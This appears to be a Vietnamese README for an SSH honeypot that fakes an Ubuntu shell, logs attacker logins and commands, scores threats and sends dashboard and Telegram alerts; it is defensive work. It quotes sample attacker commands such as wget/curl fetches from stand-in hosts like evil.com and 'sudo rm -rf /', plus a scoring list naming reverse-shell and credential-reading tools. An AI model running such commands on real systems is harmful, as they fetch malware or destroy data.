# 🍯 SSH Honeypot Attack Monitoring System

Hệ thống **bẫy SSH (SSH Honeypot)** toàn diện, được xây dựng bằng Python + React. Hệ thống giả lập một máy chủ Linux thật để dụ kẻ tấn công kết nối vào, ghi lại toàn bộ hành vi của chúng, tính điểm mức độ nguy hiểm, và phát cảnh báo realtime qua Telegram + Dashboard web.

---

## 📋 Mục lục

- [Tổng quan kiến trúc](#tổng-quan-kiến-trúc)
- [Tính năng chính](#tính-năng-chính)
- [Cài đặt](#cài-đặt)
- [Cấu hình](#cấu-hình)
- [Khởi động hệ thống](#khởi-động-hệ-thống)
- [Phân tích chi tiết từng module](#phân-tích-chi-tiết-từng-module)
  - [Honeypot Engine](#1-honeypot-engine-thư-mục-honeypot)
  - [Backend API](#2-backend-api-thư-mục-backend)
  - [Frontend Dashboard](#3-frontend-dashboard-thư-mục-frontend)
- [Luồng dữ liệu hoàn chỉnh](#luồng-dữ-liệu-hoàn-chỉnh)
- [Hệ thống chấm điểm mối đe dọa](#hệ-thống-chấm-điểm-mối-đe-dọa-threat-scoring)
- [Schema cơ sở dữ liệu](#schema-cơ-sở-dữ-liệu)
- [REST API Endpoints](#rest-api-endpoints)
- [Cảnh báo Telegram](#cảnh-báo-telegram)

---

## Tổng quan kiến trúc

```
┌─────────────────────────────────────────────────────────┐
│                    main.py (Entry Point)                │
│                                                         │
│   ┌─────────────────┐      ┌─────────────────────────┐  │
│   │  SSH Honeypot   │      │    FastAPI Backend       │  │
│   │  (Thread riêng) │──────│  (Async + WebSocket)    │  │
│   │   port: 2222    │queue │       port: 8000         │  │
│   └─────────────────┘      └────────────┬────────────┘  │
│                                          │               │
│                             ┌────────────▼────────────┐  │
│                             │   SQLite Database        │  │
│                             │   (honeypot.db)          │  │
│                             └─────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
                                          │
                              ┌───────────▼───────────┐
                              │  React Dashboard      │
                              │  (frontend/dist)      │
                              │  port: 8000/          │
                              └───────────────────────┘
                                          │
                              ┌───────────▼───────────┐
                              │   Telegram Bot        │
                              │  (Cảnh báo tức thì)   │
                              └───────────────────────┘
```

Toàn bộ hệ thống chạy trên **một tiến trình duy nhất**. SSH Honeypot chạy trong một thread riêng (daemon thread), trong khi FastAPI + Uvicorn chạy async ở thread chính. Hai phần giao tiếp với nhau qua `queue.Queue` thread-safe.

---

## Tính năng chính

| Tính năng | Mô tả |
|---|---|
| 🎭 **Fake SSH Server** | Giả lập SSH server Ubuntu 20.04, **chấp nhận MỌI mật khẩu** để dụ hacker ở lại lâu hơn |
| 🐚 **Fake Interactive Shell** | Sau khi "đăng nhập", hacker được thả vào môi trường Bash giả — không có lệnh nào thật sự được thực thi |
| 🗂️ **Virtual Filesystem** | Hệ thống file ảo hoàn chỉnh: `/etc/passwd`, `/etc/shadow`, SSH keys, logs... đều là dữ liệu giả nhưng trông rất thật |
| 🧠 **Threat Scoring Engine** | Tự động chấm điểm mức độ nguy hiểm của từng cuộc tấn công và từng lệnh được gõ |
| 📊 **Realtime Dashboard** | Giao diện web React theo dõi tấn công trực tiếp qua WebSocket |
| 📱 **Telegram Alerts** | Gửi cảnh báo tức thì qua bot Telegram với rate-limiting (cooldown 30s/IP) |
| 🗄️ **SQLite Storage** | Lưu trữ bền vững tất cả lần tấn công, session và lệnh được gõ |

---

## Cài đặt

### Yêu cầu

- Python 3.10+
- Node.js 18+ (để build frontend)

### Bước 1 — Cài dependencies Python

```bash
pip install -r requirements.txt
```

`requirements.txt` bao gồm:
- `paramiko` — thư viện SSH để dựng server giả
- `fastapi` — web framework cho API + WebSocket
- `uvicorn[standard]` — ASGI server chạy FastAPI
- `requests` — gửi tin nhắn Telegram
- `websockets` — hỗ trợ WebSocket

### Bước 2 — Build Frontend

```bash
cd frontend
npm install
npm run build
cd ..
```

Lệnh này sẽ tạo ra thư mục `frontend/dist/` chứa toàn bộ giao diện web đã được biên dịch. FastAPI sẽ tự động phục vụ thư mục này.

---

## Cấu hình

Tất cả cấu hình tập trung trong file [`config.py`](config.py):

```python
# Token và Chat ID của bot Telegram (lấy từ @BotFather)
TELEGRAM_TOKEN  = 'YOUR_BOT_TOKEN'
TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'

# SSH Honeypot lắng nghe trên cổng nào
HONEYPOT_HOST = '0.0.0.0'
HONEYPOT_PORT = 2222        # Nên đổi thành 22 trên server thật

# FastAPI + Dashboard chạy trên cổng nào
API_HOST = '0.0.0.0'
API_PORT = 8000

# Đường dẫn file SQLite
DB_PATH = 'honeypot.db'
```

> ⚠️ **Bảo mật:** Đừng commit file `config.py` chứa token thật lên Git. Hãy dùng biến môi trường hoặc `.env` cho môi trường production.

---

## Khởi động hệ thống

```bash
python main.py
```

Kết quả terminal sẽ hiện:
```
[*] SSH Honeypot (fake-shell mode) on 0.0.0.0:2222
[*] API server at http://0.0.0.0:8000
[*] Dashboard:  http://0.0.0.0:8000
```

Truy cập Dashboard: **http://localhost:8000**

---

## Phân tích chi tiết từng module

### 1. Honeypot Engine (thư mục `honeypot/`)

Đây là "trái tim" của hệ thống, bao gồm 7 file:

---

#### `ssh_server.py` — Cổng vào chính

**Chức năng:** Khởi động một TCP server trên cổng 2222. Mỗi kết nối đến được xử lý trong một thread riêng (daemon thread), cho phép xử lý hàng trăm kết nối song song.

**Điểm đặc biệt quan trọng — Chiến thuật bẫy:**

```python
def check_auth_password(self, username: str, password: str) -> int:
    # 1. Tính điểm threat ngay lập tức
    score, level = calculate_login_threat(ip, username, password)
    
    # 2. Lưu vào DB + broadcast WebSocket
    save_attack(ip, username, password, now, score, level)
    bus.emit_attack(attack)
    
    # 3. Gửi Telegram (luồng riêng, không chặn)
    threading.Thread(target=send_login_alert, args=(attack,), daemon=True).start()
    
    # 4. CHẤP NHẬN mọi mật khẩu — hacker nghĩ đã vào được!
    return paramiko.AUTH_SUCCESSFUL  # ← Luôn thành công!
```

Khác với honeypot đơn giản (reject tất cả), hệ thống này **chấp nhận đăng nhập** để hacker ở lại và tiếp tục thực hiện hành vi, qua đó thu thập được nhiều thông tin hơn.

Sau khi "đăng nhập" thành công, hacker được chuyển vào `FakeShell`.

---

#### `fake_shell.py` — Shell giả lập

**Chức năng:** Mô phỏng một phiên terminal Bash tương tác hoàn chỉnh. Đọc từng byte từ kênh SSH, xử lý ký tự đặc biệt (Backspace, Ctrl-C, Ctrl-D, phím mũi tên), và trả về kết quả giả.

**Banner đăng nhập giống thật 100%:**

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-91-generic x86_64)

  System load:  0.12               Processes:             98
  Usage of /:   74.8% of 19.76GB   Users logged in:        1
  Memory usage: 52%                IPv4 address for eth0: 192.168.1.10

Last login: Thu May 29 16:00:00 2026 from 192.168.1.50
```

**Prompt động theo username:**
- User `root` → `root@ubuntu-server:~#`
- User `admin` → `admin@ubuntu-server:~$`

**Vòng lặp xử lý ký tự:**
```python
for byte in data:
    if ch in ('\r', '\n'):     → Thực thi lệnh, hiển thị prompt mới
    elif byte in (127, 8):     → Xử lý Backspace (xóa ký tự cuối)
    elif ch == '\x03':         → Ctrl-C (hủy lệnh hiện tại)
    elif ch == '\x04':         → Ctrl-D (thoát session)
    elif ch == '\x1b':         → ESC / phím mũi tên (bỏ qua)
    elif byte >= 32:           → Ký tự in được (echo lại màn hình)
```

Khi session kết thúc, `emit_session_end()` được gọi để lưu toàn bộ lịch sử lệnh vào DB.

---

#### `command_handler.py` — Registry lệnh giả

**Chức năng:** Quản lý ~50 lệnh Linux được giả lập. Mỗi lệnh trả về chuỗi text thuần, không có lệnh OS nào được thực thi.

**Danh sách lệnh được hỗ trợ:**

| Nhóm | Lệnh |
|---|---|
| Filesystem | `ls`, `ll`, `la`, `cd`, `pwd`, `cat`, `echo`, `mkdir`, `touch`, `rm`, `file` |
| System info | `uname`, `ps`, `uptime`, `hostname`, `whoami`, `id`, `history`, `env` |
| Network | `ifconfig`, `ip addr`, `netstat`, `ss`, `nmap` |
| Nguy hiểm | `wget`, `curl`, `nc`/`ncat`, `ssh`, `scp` |
| Privilege | `sudo`, `su`, `passwd`, `useradd`, `usermod` |
| Packages | `apt`, `apt-get` |
| Khác | `chmod`, `crontab`, `python`, `which`, `man`, `clear`, `exit` |

**Các lệnh "nguy hiểm" đều bị chặn khéo léo:**
- `wget http://malware.com/exploit.sh` → Báo lỗi "unable to resolve host" (giả lập DNS fail)
- `curl http://c2-server.com` → Báo lỗi "Could not resolve host"
- `sudo rm -rf /` → Báo "3 incorrect password attempts"
- `apt install nmap` → Báo "Permission denied (lock file)"

**Lệnh `ls -l` có output chi tiết thật sự:**
```
total 12
drwxr-xr-x 1 root root 4096 May 29 17:30 .
drwxr-xr-x 1 root root 4096 May 29 17:00 ..
drwxr-xr-x 1 root root 4096 May 29 17:30 Documents
-rw-r--r-- 1 root root 1024 May 29 17:30 notes.txt
```

---

#### `virtual_fs.py` — Hệ thống file ảo

**Chức năng:** Cung cấp một cây thư mục Linux hoàn chỉnh được lưu hoàn toàn trong RAM (Python dictionary). Không đọc bất kỳ file nào từ máy thật.

**Cây thư mục giả:**
```
/
├── bin/
├── etc/
│   ├── passwd          ← Chứa user giả (root, admin, www-data...)
│   ├── shadow          ← Chứa password hash giả (trông như thật!)
│   ├── hosts
│   └── cron.d/backup
├── home/
│   └── admin/
│       ├── notes.txt   ← "TODO: Change default password" 🪤
│       ├── config.txt  ← DB credentials giả (bẫy!)
│       └── .bash_history
├── root/
│   └── .ssh/
│       ├── id_rsa      ← RSA private key giả
│       └── authorized_keys
├── tmp/
│   └── sess_a1b2c3     ← Session token giả
└── var/
    └── log/
        ├── auth.log    ← Log SSH giả
        └── syslog
```

**Tại sao cần file ảo?** Khi hacker gõ `cat /etc/shadow` hay `cat /home/admin/config.txt`, họ sẽ thấy dữ liệu trông rất thật (password hash, database credentials...). Điều này khiến họ nghĩ đã xâm nhập được server thật và tiếp tục ở lại lâu hơn — trong khi hệ thống âm thầm ghi lại mọi hành động.

---

#### `threat_engine.py` — Bộ chấm điểm mối đe dọa

**Chức năng:** Tính điểm `threat_score` cho từng lần đăng nhập và từng lệnh được gõ. Không thực thi lệnh nào — hoàn toàn dựa trên heuristic.

**Chấm điểm lúc đăng nhập (`calculate_login_threat`):**

| Điều kiện | Điểm thêm |
|---|---|
| Mọi lần đăng nhập | +1 (base) |
| Username nhạy cảm (`root`, `admin`, `ubuntu`, `pi`...) | +5 |
| Mật khẩu phổ biến (`123456`, `password`, `admin`...) | +2 |
| Brute-force: > 5 lần/60 giây từ cùng IP | +30 |
| High-frequency: > 10 lần/60 giây từ cùng IP | +20 |

**Chấm điểm lệnh shell (`score_command`):**

| Lệnh | Điểm | Ghi chú |
|---|---|---|
| `nc`/`ncat`/`netcat` | 25 | Reverse shell |
| `hydra`, `masscan` | 20-25 | Công cụ tấn công |
| `wget`, `curl` | 20 | Download malware |
| `wget *.sh`, `curl *.bin` | +10 thêm | Tải script/binary |
| `chmod +x` | +5 thêm | Cấp quyền thực thi |
| `cat /etc/shadow` | +15 thêm | Đọc file nhạy cảm |
| `nmap`, `crontab` | 20 | Recon / persistence |
| `scp`, `dd`, `useradd` | 15 | Exfiltration / persistence |
| `sudo`, `ssh`, `rm` | 10 | Privilege escalation |

**Bảng phân loại mức độ (`threat_level`):**

| Điểm | Mức độ | Ý nghĩa |
|---|---|---|
| 1–20 | 🟡 `LOW` | Scan thông thường, thử mật khẩu đơn lẻ |
| 21–50 | 🟠 `MEDIUM` | Có dấu hiệu brute-force hoặc dùng lệnh đáng ngờ |
| 51–80 | 🔴 `HIGH` | Brute-force nghiêm trọng hoặc cố gắng leo thang đặc quyền |
| 81+ | 🚨 `CRITICAL` | Tấn công phối hợp, dùng công cụ hack chuyên nghiệp |

---

#### `websocket_events.py` — Event Bus

**Chức năng:** Cầu nối giữa honeypot (synchronous, multi-thread) và FastAPI backend (async). Đẩy các sự kiện vào `queue.Queue` thread-safe.

**4 loại sự kiện:**

```python
{ "type": "attack",          "data": { ip, username, password, threat_score... } }
{ "type": "session_start",   "data": { session_id, ip, username... } }
{ "type": "session_command", "data": { session_id, cmd, score_delta... } }
{ "type": "session_end",     "data": { session_id, duration_seconds, commands[] } }
```

---

#### `telegram_service.py` — Dịch vụ Telegram

Gửi 2 loại cảnh báo:
- **Login alert** — khi có đăng nhập mới
- **Shell alert** — khi hacker gõ lệnh nguy hiểm (score_delta > 0)

Tích hợp **rate-limiting** 30 giây/IP để tránh spam khi bị brute-force.

---

### 2. Backend API (thư mục `backend/`)

#### `main.py` — FastAPI Application

**WebSocket Manager** (`ConnectionManager`): Quản lý danh sách các browser đang kết nối. Khi có sự kiện mới từ honeypot queue, `broadcast()` gửi đến tất cả client đang mở Dashboard.

**Queue Processor** (`_process_queue`): Coroutine async chạy vòng lặp vô tận, poll queue mỗi 100ms. Khi nhận event `session_end`, tự động lưu session và commands vào DB.

**REST Endpoints:**

```
GET  /ws                           → WebSocket realtime feed
GET  /api/attacks                  → 50 lần tấn công gần nhất
GET  /api/stats                    → Thống kê tổng hợp
GET  /api/sessions                 → 20 session gần nhất
GET  /api/sessions/{id}/commands   → Chi tiết lệnh của một session
```

---

#### `database.py` — Lớp truy cập SQLite

**Thread-safety:** Dùng `threading.Lock()` cho mọi thao tác ghi để tránh race condition khi nhiều hacker kết nối cùng lúc.

**`get_stats()`** trả về dashboard data:
- Tổng số lần tấn công (alltime + today)
- Username và Password bị thử nhiều nhất
- Phân bố tấn công theo giờ trong ngày
- Top 5 IP tấn công nhiều nhất
- Top 5 cặp credential được thử nhiều nhất

---

#### `telegram_bot.py` — Backend Telegram (có cooldown)

Phiên bản nâng cấp của telegram service trong honeypot module. Có thêm cơ chế cooldown 30 giây/IP và emoji phân loại:
- 🟡 LOW / 🟠 MEDIUM / 🔴 HIGH / 🚨 CRITICAL

---

#### `threat_scorer.py`

Module helper để tính threat score ở phía backend (dùng trong trường hợp cần validate lại).

---

### 3. Frontend Dashboard (thư mục `frontend/`)

Xây dựng bằng **React + Vite + TailwindCSS**.

#### Các component chính:

| Component | Chức năng |
|---|---|
| `App.jsx` | Root component, quản lý WebSocket, fetch dữ liệu khởi đầu, routing state |
| `Statistics.jsx` | Thẻ thống kê: tổng tấn công, hôm nay, username/password phổ biến nhất |
| `LiveFeed.jsx` | Bảng tấn công realtime — cuộn lên khi có tấn công mới |
| `AttackChart.jsx` | Biểu đồ tấn công theo giờ, Top IP, Top Credentials |
| `SessionFeed.jsx` | Danh sách phiên shell — mở rộng để xem từng lệnh đã gõ + điểm threat |
| `ThreatBadge.jsx` | Badge màu sắc (LOW/MEDIUM/HIGH/CRITICAL) |

#### Kết nối WebSocket:

```javascript
// Tự động tái kết nối sau 3 giây khi bị ngắt
ws.onclose = () => {
  reconnectTimer.current = setTimeout(connect, 3000)
}

// Xử lý 4 loại event từ server
ws.onmessage = (e) => {
  const { type, data } = JSON.parse(e.data)
  // attack, session_start, session_command, session_end
}
```

---

## Luồng dữ liệu hoàn chỉnh

```
Hacker SSH → Port 2222
      │
      ▼
ssh_server.py
  ├─ Ghi nhận IP/user/pass
  ├─ calculate_login_threat() → threat_score, threat_level
  ├─ save_attack() → SQLite [attacks table]
  ├─ bus.emit_attack() → Queue
  ├─ send_login_alert() → Telegram [thread riêng]
  └─ AUTH_SUCCESSFUL → FakeShell.run()
           │
           ▼
      fake_shell.py
        ├─ Hiển thị banner Ubuntu giả
        ├─ Đọc lệnh từ hacker
        ├─ score_command() → score_delta
        ├─ bus.emit_command() → Queue
        ├─ send_shell_alert() → Telegram [nếu score_delta > 0]
        ├─ CommandRegistry.handle() → response text giả
        └─ Khi thoát: bus.emit_session_end() → Queue
                           │
                           ▼
                     backend/main.py
                       ├─ _process_queue() [async loop]
                       ├─ manager.broadcast() → WebSocket → Dashboard
                       └─ save_session() + save_commands() → SQLite
```

---

## Hệ thống chấm điểm mối đe dọa (Threat Scoring)

### Ví dụ thực tế

**Tình huống 1 — Bot scan đơn giản:**
```
IP: 1.2.3.4, thử user=root, pass=123456
→ base(1) + sensitive_user(5) + common_pass(2) = 8 điểm → LOW
```

**Tình huống 2 — Brute-force:**
```
IP: 5.6.7.8, thử 15 lần trong 60 giây
→ base(1) + sensitive_user(5) + brute_force(30) + high_freq(20) = 56 điểm → HIGH
```

**Tình huống 3 — Attacker sau khi vào shell:**
```
Lệnh: wget http://evil.com/rootkit.sh
→ wget(20) + script_extension(10) = 30 điểm thêm → leo thang lên CRITICAL
```

---

## Schema cơ sở dữ liệu

### Bảng `attacks` — Mỗi lần thử đăng nhập
```sql
id            INTEGER PRIMARY KEY
ip            TEXT     -- IP của kẻ tấn công
username      TEXT     -- Username thử đăng nhập
password      TEXT     -- Password thử đăng nhập
timestamp     TEXT     -- Thời gian (YYYY-MM-DD HH:MM:SS)
threat_score  INTEGER  -- Điểm nguy hiểm tổng
threat_level  TEXT     -- LOW / MEDIUM / HIGH / CRITICAL
```

### Bảng `sessions` — Mỗi phiên shell tương tác
```sql
session_id        TEXT PRIMARY KEY  -- UUID ngắn (12 ký tự hex)
ip, username, password, login_time, end_time
threat_score, threat_level
duration_seconds  INTEGER  -- Thời gian phiên (giây)
command_count     INTEGER  -- Số lệnh đã gõ
```

### Bảng `commands` — Mỗi lệnh trong session
```sql
id          INTEGER PRIMARY KEY
session_id  TEXT     -- FK → sessions.session_id
command     TEXT     -- Lệnh đã gõ
timestamp   TEXT
score_delta INTEGER  -- Điểm tăng thêm từ lệnh này
```

---

## REST API Endpoints

### `GET /api/stats`
```json
{
  "total": 1547,
  "today": 83,
  "top_username": "root",
  "top_password": "123456",
  "by_hour": [{"hour": "09", "cnt": 12}, ...],
  "top_ips": [{"ip": "1.2.3.4", "cnt": 230}, ...],
  "top_creds": [{"cred": "root/123456", "cnt": 95}, ...]
}
```

### `GET /api/attacks`
Trả về 50 record mới nhất từ bảng `attacks`.

### `GET /api/sessions`
Trả về 20 session mới nhất từ bảng `sessions`.

### `GET /api/sessions/{session_id}/commands`
```json
[
  {"command": "whoami", "timestamp": "2026-05-29 17:31:00", "score_delta": 0},
  {"command": "wget http://evil.com/shell.sh", "timestamp": "...", "score_delta": 30}
]
```

### `WebSocket /ws`
Nhận realtime events dạng JSON theo 4 loại type như đã mô tả ở trên.

---

## Cảnh báo Telegram

Hệ thống gửi 2 loại tin nhắn:

**Khi có đăng nhập:**
```
🔴 SSH ATTACK DETECTED

IP: 1.2.3.4
Username: root
Password: toor123
Risk: HIGH (Score: 56)
Time: 2026-05-29 17:31:00
```

**Khi hacker gõ lệnh nguy hiểm:**
```
⚡ SHELL ACTIVITY [HIGH]

Session: abc123def456
IP: 1.2.3.4  User: root
CMD: wget http://evil.com/rootkit.sh
+30 pts → Total: 86 (CRITICAL)
```

---

## Lưu ý bảo mật

- **KHÔNG** triển khai honeypot này trên máy tính cá nhân đang dùng thường xuyên. Nên dùng VPS riêng.
- **KHÔNG** cho phép kết nối từ honeypot ra Internet thật (dùng firewall outbound rules).
- File `config.py` chứa token Telegram — **KHÔNG** commit lên Git public.
- Hệ thống **không thực thi lệnh OS nào** từ hacker — an toàn về mặt sandbox.
- Tuy nhiên, nên chạy dưới user không có quyền root trên server host.
